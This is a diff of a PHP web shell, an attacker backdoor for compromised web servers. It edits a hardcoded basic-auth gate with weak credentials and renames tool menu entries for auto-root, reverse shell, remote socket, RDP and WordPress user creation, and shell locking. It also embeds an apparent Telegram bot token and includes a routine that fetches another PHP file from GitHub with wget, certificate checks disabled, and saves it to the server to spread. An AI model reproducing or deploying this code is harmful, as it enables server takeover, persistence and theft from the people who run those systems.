@@ -1,20 +1,5 @@
 <?php
-
-$user = "human";
-
-$pass = "password";
-
- if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))
-
- {
-
-  header("WWW-Authenticate: Basic realm=\"M.A was here\"");
-
-  header("HTTP/1.0 401 Unauthorized");
-
-  exit();
-
- }
+ob_start();
 session_start();
 @set_time_limit(0);
 @clearstatcache();
@@ -23,6 +8,22 @@ session_start();
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
+$user = "human";
+
+$pass = "password";
+
+ if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))
+
+ {
+
+  header("WWW-Authenticate: Basic realm=\"Dont Touch Me SKiddies\"");
+
+  header("HTTP/1.0 401 Unauthorized");
+
+  exit();
+
+ }
+
 $bcripthash = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
 $angka = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
@@ -192,7 +193,7 @@ if ($_GET['don'] == true) {
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
     <style>
-        @media screen and (min-width: 768px) and (max-width: 1200px) and (min-height:720px) {
+        @media screen and (min-width: 740px) and (max-width: 1280px) and (min-height:720px) {
             .code-editor-container {
                 height: 85vh !important;
             }
@@ -252,7 +253,7 @@ if ($_GET['don'] == true) {
 
         body {
             background-color: #0e0f17;
-            font-family: monospace
+            font-family: sans-serif monospace
         }
 
         .btn-modal-close:hover,
@@ -618,6 +619,7 @@ if ($_GET['don'] == true) {
 <body>
     <div class="menu-header">
         <ul>
+         <div>
             <li><i class="fa-solid fa-server">SERVER :</i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?>&nbsp;<?= $fungsi[8](); ?></li>
             <li><i class="fa-solid fa-network-wired">IP :</i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
             <li><i class="fa-solid fa-globe">DISABLED :</i>&nbsp;<?= s(); ?></li>
@@ -631,16 +633,16 @@ if ($_GET['don'] == true) {
     </div>
     <div class="menu-tools">
         <ul>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> CMD</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Backdoor Destroyer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i>Allow htaccess</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
             <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
             <li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create User</a></li>
             <li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> REVERSE SHELL</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&installgsocket" class="btn-submit"><i class="fa-solid fa-plug"></i> Install GSocket</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&installgsocket" class="btn-submit"><i class="fa-solid fa-plug"></i> REMOTE SOCKET</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
             <li>
     <a href="?tebar=true" class="btn-submit">
@@ -656,7 +658,7 @@ function download_file() {
     $url = "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/404.php";
 
     // Lokasi penyimpanan file unduhan di server
-    $download_path = __DIR__ . "/404.php";
+    $download_path = __DIR__ . "/tebar.php";
 
     // Menggunakan wget dengan --no-check-certificate
     $command = "wget --no-check-certificate -O $download_path $url";
@@ -678,7 +680,7 @@ if (isset($_GET['tebar'])) {
     if (download_file()) {
         // Membangun URL untuk file download.php
         $base_url = $_SERVER['REQUEST_SCHEME'] . "://" . $_SERVER['HTTP_HOST'];
-        $download_url = $base_url . dirname($_SERVER['SCRIPT_NAME']) . "/404.php";
+        $download_url = $base_url . dirname($_SERVER['SCRIPT_NAME']) . "/tebar.php";
 
         // Gunakan SweetAlert2 untuk menampilkan pesan sukses
         echo "<script>
@@ -1153,7 +1155,7 @@ if (isset($_POST['submitwp'])) {
 
 
 if (isset($_GET['unlockshell'])) {
-    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
+    if (cmd("killall -9 php") && cmd("pkill -9 php"))  {
         success();
     } else {
         failed();
